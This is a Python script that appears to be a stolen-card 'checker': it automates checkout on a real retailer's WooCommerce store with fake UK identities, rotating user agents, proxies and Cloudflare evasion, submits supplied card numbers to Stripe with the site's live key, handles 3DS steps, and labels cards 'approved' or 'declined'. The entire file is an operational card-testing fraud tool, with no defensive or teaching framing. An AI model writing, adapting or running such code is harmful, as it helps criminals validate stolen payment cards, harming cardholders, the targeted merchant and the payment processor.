import cloudscraper
import json
import time
import random
import asyncio
from urllib.parse import quote_plus
from fake_useragent import UserAgent
from datetime import datetime
from faker import Faker
from concurrent.futures import ThreadPoolExecutor

executor = ThreadPoolExecutor(max_workers=10)

DELAY_BETWEEN_REQUESTS = 2
DELAY_RANDOM_RANGE = 1


def random_delay():
    """Add random delay between requests"""
    delay = DELAY_BETWEEN_REQUESTS + random.uniform(0, DELAY_RANDOM_RANGE)
    time.sleep(delay)


def create_stripe_auth(card, mes, ano, cvv, proxy=None):
    """
    Stripe Auth checker via balliante.com

    Args:
        card: Card number
        mes: Expiry month
        ano: Expiry year (2 or 4 digits)
        cvv: CVV code
        proxy: Optional proxy string

    Returns:
        dict with status and response
    """
    try:
        # Normalize year format
        cc = card
        mm = mes
        yy = ano
        if yy.startswith('20') and len(yy) == 4:
            yy = yy[2:]

        # Initialize cloudscraper
        scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )

        # Set proxy if provided
        if proxy:
            proxies = {
                "http": proxy,
                "https": proxy,
            }
            scraper.proxies = proxies

        # Generate fake UK data
        fake = Faker('en_GB')
        first_name = fake.first_name()
        last_name = fake.last_name()
        address_1 = fake.street_address()
        city = fake.city()
        state = fake.random_element(elements=(
            'London', 'Manchester', 'Yorkshire', 'Essex',
            'Kent', 'Lancashire', 'West Midlands', 'Glasgow',
            'Edinburgh', 'Birmingham', 'Liverpool', 'Bristol',
            'Sheffield', 'Leeds', 'Cardiff', 'Belfast',
            'Nottingham', 'Leicester', 'Coventry', 'Hull'
        ))
        postcode = fake.postcode()
        email = fake.email(domain='gmail.com')
        phone = fake.phone_number()
        name = f"{first_name}+{last_name}"
        email_encoded = quote_plus(email)

        # User agent
        ua = UserAgent()
        user_agent = ua.random

        # Billing info encoded
        billing_address_1 = quote_plus(address_1)
        billing_city = quote_plus(city)
        billing_state = quote_plus(state)
        billing_postcode = quote_plus(postcode)
        billing_phone = quote_plus(phone)

        # Step 1: Get product page
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'user-agent': user_agent,
        }

        response = scraper.get(
            'https://www.balliante.com/store/product/2-m-high-speed-hdmi-cable-hdmi-m-m/',
            headers=headers,
        )
        random_delay()

        # Step 2: Add to cart
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'cache-control': 'max-age=0',
            'origin': 'null',
            'priority': 'u=0, i',
            'user-agent': user_agent,
        }

        params = {
            'quantity': '1',
            'add-to-cart': '5360',
        }

        response = scraper.post(
            'https://www.balliante.com/store/product/2-m-high-speed-hdmi-cable-hdmi-m-m/',
            headers=headers,
            params=params,
        )
        random_delay()

        # Step 3: Get checkout page
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'priority': 'u=0, i',
            'user-agent': user_agent,
        }

        response = scraper.get('https://www.balliante.com/store/checkout/', headers=headers)
        random_delay()

        # Extract nonces
        html = response.text
        try:
            noncewo = html.split('name="woocommerce-process-checkout-nonce"')[1].split('value="')[1].split('"')[0]
            noncelogin = html.split('name="woocommerce-login-nonce"')[1].split('value="')[1].split('"')[0]
        except:
            return {"status": "error", "response": "Failed to extract checkout nonces"}

        # Step 4: Create Stripe payment method
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'user-agent': user_agent,
        }

        data = (
            f'billing_details[name]={name}&'
            f'billing_details[email]={email_encoded}&'
            f'billing_details[phone]={billing_phone}&'
            f'billing_details[address][city]={billing_city}&'
            f'billing_details[address][country]=GB&'
            f'billing_details[address][line1]={billing_address_1}&'
            f'billing_details[address][line2]=&'
            f'billing_details[address][postal_code]={billing_postcode}&'
            f'billing_details[address][state]={billing_state}&'
            f'type=card&'
            f'card[number]={cc}&'
            f'card[cvc]={cvv}&'
            f'card[exp_year]={yy}&'
            f'card[exp_month]={mm}&'
            f'allow_redisplay=unspecified&'
            f'payment_user_agent=stripe.js%2F4209db5aac%3B+stripe-js-v3%2F4209db5aac%3B+payment-element%3B+deferred-intent&'
            f'referrer=https%3A%2F%2Fwww.balliante.com&'
            f'key=pk_live_51Fftn2B5suwcKLEosnFZXZigPCvwIRldF9bqwCyzcOzNqfYfdGLfO88GdBYH46sGide0qSHP7WMbm6rrV2KQKlst00Nff2HGzm&'
        )

        response = scraper.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        random_delay()

        # Check for card errors
        try:
            json_data = response.json()

            if 'error' in json_data:
                error_msg = json_data['error'].get('message', 'Card declined')
                error_code = json_data['error'].get('code', 'card_declined')

                # Map error codes
                if 'incorrect' in error_code.lower() or 'invalid' in error_code.lower():
                    if 'number' in error_code.lower():
                        return {"status": "declined", "response": "INCORRECT_NUMBER"}
                    elif 'cvc' in error_code.lower():
                        return {"status": "declined", "response": "INVALID_CVC"}
                    elif 'expiry' in error_code.lower():
                        return {"status": "declined", "response": "INVALID_EXPIRY"}

                return {"status": "declined", "response": error_msg.upper().replace(' ', '_')}

            stripe_account = response.headers.get('Stripe-Account')
            idstripe = json_data.get('id')

            if not idstripe:
                return {"status": "error", "response": "Failed to create payment method"}

        except:
            return {"status": "error", "response": "Invalid payment method response"}

        # Step 5: Submit checkout
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.balliante.com',
            'priority': 'u=1, i',
            'user-agent': user_agent,
        }

        params = {
            'wc-ajax': 'checkout',
        }

        data = (
            f'username=&'
            f'password=&'
            f'woocommerce-login-nonce={noncelogin}&'
            f'_wp_http_referer=https%3A%2F%2Fwww.balliante.com%2Fstore%2Fcheckout%2F%3FelementorPageId%3D118%26elementorWidgetId%3D2722c17&'
            f'redirect=https%3A%2F%2Fwww.balliante.com%2Fstore%2Fcheckout%2F&'
            f'wc_order_attribution_session_entry=https%3A%2F%2Fwww.balliante.com%2Fstore%2Fproducts%2F&'
            f'billing_email={email_encoded}&'
            f'billing_first_name={first_name}&'
            f'billing_last_name={last_name}&'
            f'billing_country=GB&'
            f'billing_address_1={billing_address_1}&'
            f'billing_address_2=&'
            f'billing_city={billing_city}&'
            f'billing_state={billing_state}&'
            f'billing_postcode={billing_postcode}&'
            f'billing_phone={billing_phone}&'
            f'shipping_first_name=&'
            f'shipping_last_name=&'
            f'shipping_country=GB&'
            f'shipping_address_1=&'
            f'shipping_address_2=&'
            f'shipping_city=&'
            f'shipping_state=&'
            f'shipping_postcode=&'
            f'shipping_phone=&'
            f'order_comments=&'
            f'shipping_method%5B0%5D=flat_rate%3A1&'
            f'coupon_code=&'
            f'payment_method=stripe&'
            f'wc-stripe-payment-method-upe=&'
            f'wc_stripe_selected_upe_payment_type=&'
            f'wc-stripe-is-deferred-intent=1&'
            f'woocommerce-process-checkout-nonce={noncewo}&'
            f'wc-stripe-payment-method={idstripe}'
        )

        response = scraper.post('https://www.balliante.com/store/', params=params, headers=headers, data=data)
        random_delay()

        try:
            response_data = response.json()
            redirect = response_data.get('redirect', '')

            if not redirect or len(redirect.split(':')) < 3:
                # Check for error messages
                if 'messages' in response_data or 'message' in response_data:
                    return {"status": "declined", "response": "CARD_DECLINED"}
                return {"status": "declined", "response": "INCORRECT_NUMBER"}

            full_secret = redirect.split(':')[2]

            if '_secret_' in full_secret:
                pi_only = full_secret.split('_secret_')[0]
            else:
                return {"status": "declined", "response": "INCORRECT_NUMBER"}

        except:
            return {"status": "declined", "response": "CARD_DECLINED"}

        # Step 6: Confirm payment intent
        headers = {
            'accept': 'application/json',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'user-agent': user_agent,
        }

        data = f'use_stripe_sdk=true&mandate_data[customer_acceptance][type]=online&mandate_data[customer_acceptance][online][infer_from_client]=true&key=pk_live_51Fftn2B5suwcKLEosnFZXZigPCvwIRldF9bqwCyzcOzNqfYfdGLfO88GdBYH46sGide0qSHP7WMbm6rrV2KQKlst00Nff2HGzm&_stripe_version=2024-06-20&client_secret={full_secret}'

        response = scraper.post(
            f'https://api.stripe.com/v1/payment_intents/{pi_only}/confirm',
            headers=headers,
            data=data,
        )

        try:
            response_data = response.json()
            three_d_secure_2_source = response_data.get('next_action', {}).get('use_stripe_sdk', {}).get('three_d_secure_2_source')

            # Step 7: 3DS fingerprint (if required)
            if three_d_secure_2_source:
                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'cache-control': 'no-cache',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://geoissuer.cardinalcommerce.com',
                    'pragma': 'no-cache',
                    'priority': 'u=0, i',
                    'referer': 'https://geoissuer.cardinalcommerce.com/',
                    'user-agent': user_agent,
                }

                data = {
                    'threeDSMethodData': 'eyJ0aHJlZURTU2VydmVyVHJhbnNJRCI6ImMxMmU5NmRhLWY0OWUtNDc1Yi05NzMyLTZkYWNjOTJkZTdhMCJ9',
                }

                response = scraper.post(
                    f'https://hooks.stripe.com/3d_secure_2/fingerprint/{stripe_account}/{three_d_secure_2_source}',
                    headers=headers,
                    data=data,
                )

                # Step 8: 3DS authenticate
                headers = {
                    'accept': 'application/json',
                    'cache-control': 'no-cache',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'pragma': 'no-cache',
                    'priority': 'u=1, i',
                    'referer': 'https://js.stripe.com/',
                    'user-agent': user_agent,
                }

                browser_data = {
                    "fingerprintAttempted": True,
                    "challengeWindowSize": None,
                    "threeDSCompInd": "Y",
                    "browserJavaEnabled": False,
                    "browserJavascriptEnabled": True,
                    "browserLanguage": "en-GB",
                    "browserColorDepth": "24",
                    "browserScreenHeight": "1080",
                    "browserScreenWidth": "1920",
                    "browserTZ": "0",
                    "browserUserAgent": user_agent
                }

                browser_json = json.dumps(browser_data)
                browser_encoded = quote_plus(browser_json)

                data = (
                    f'source={three_d_secure_2_source}&'
                    f'browser={browser_encoded}&'
                    f'one_click_authn_device_support[hosted]=false&'
                    f'one_click_authn_device_support[same_origin_frame]=false&'
                    f'one_click_authn_device_support[spc_eligible]=false&'
                    f'one_click_authn_device_support[webauthn_eligible]=false&'
                    f'one_click_authn_device_support[publickey_credentials_get_allowed]=true&'
                    f'key=pk_live_51Fftn2B5suwcKLEosnFZXZigPCvwIRldF9bqwCyzcOzNqfYfdGLfO88GdBYH46sGide0qSHP7WMbm6rrV2KQKlst00Nff2HGzm&'
                    f'_stripe_version=2024-06-20'
                )

                response = scraper.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data)

        except:
            pass

        # Step 9: Get final payment intent status
        headers = {
            'accept': 'application/json',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'user-agent': user_agent,
        }

        params = {
            'is_stripe_sdk': 'false',
            'client_secret': full_secret,
            'key': 'pk_live_51Fftn2B5suwcKLEosnFZXZigPCvwIRldF9bqwCyzcOzNqfYfdGLfO88GdBYH46sGide0qSHP7WMbm6rrV2KQKlst00Nff2HGzm',
            '_stripe_version': '2024-06-20',
        }

        response = scraper.get(f'https://api.stripe.com/v1/payment_intents/{pi_only}', params=params, headers=headers)

        try:
            data = response.json()

            # Check for payment errors
            if data.get('last_payment_error') is not None:
                error = data['last_payment_error']
                message = error.get('message', 'Card declined')
                code = error.get('code', 'generic_decline')

                # Approved codes (CVV, insufficient funds, etc.)
                approved_codes = ['incorrect_cvc', 'insufficient_funds', 'incorrect_zip', 'card_decline_rate_limit_exceeded']

                if code in approved_codes:
                    return {"status": "approved", "response": message.upper().replace(' ', '_')}
                else:
                    return {"status": "declined", "response": message.upper().replace(' ', '_')}

            # Check status
            elif data.get('status') == 'requires_action':
                return {"status": "declined", "response": "3DS_VERIFICATION_REQUIRED"}

            elif data.get('status') == 'succeeded':
                return {"status": "approved", "response": "PAYMENT_SUCCESSFUL_✅"}

            else:
                status = data.get('status', 'unknown')
                return {"status": "declined", "response": f"STATUS_{status.upper()}"}

        except:
            return {"status": "error", "response": "Failed to parse final response"}

    except Exception as e:
        return {"status": "error", "response": f"EXCEPTION: {str(e)}"}


async def async_stripe_auth(card, mes, ano, cvv, proxy=None):
    """Async wrapper for Stripe auth"""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(executor, create_stripe_auth, card, mes, ano, cvv, proxy)
